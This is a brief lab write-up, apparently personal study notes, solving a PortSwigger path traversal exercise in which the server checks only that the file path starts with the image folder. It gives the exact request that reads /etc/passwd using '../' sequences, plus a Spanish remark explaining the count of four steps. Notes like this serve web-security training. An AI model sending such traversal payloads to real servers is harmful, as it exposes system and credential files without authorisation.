# 5 - Validation of start of path

> This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.
>
>  The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.
>
>  To solve the lab, retrieve the contents of the `/etc/passwd` file.

![](../../.gitbook/assets/imagen%20%28635%29.png)

```text
GET /image?filename=/var/www/images/../../../../etc/passwd HTTP/1.1
```

Recordar que nos queremos paarar en la base folder desp de images, entonces son 4 backs

